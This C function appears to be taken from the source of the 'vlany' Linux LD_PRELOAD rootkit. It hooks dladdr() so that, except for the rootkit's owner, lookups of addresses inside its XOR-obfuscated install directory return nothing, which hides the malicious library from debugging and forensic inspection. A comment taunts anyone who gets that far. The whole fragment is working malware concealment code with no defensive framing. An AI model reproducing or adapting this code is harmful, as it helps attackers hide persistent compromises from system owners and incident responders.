int dladdr(const void *addr, Dl_info *info)
{
    #ifdef DEBUG
        printf("[vlany] dladdr() called\n");
    #endif

    HOOK(old_dladdr, CDLADDR);

    if(owned()) return old_dladdr(addr, info);

    Dl_info vlany_info;
    if(old_dladdr(addr, &vlany_info) != 0)
    {
        char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
        if(strstr(vlany_info.dli_fname, install_dir)) { CLEAN(install_dir); return 0; } // how did you even get this far? go away..
        CLEAN(install_dir);
    }

    return old_dladdr(addr, info);
}
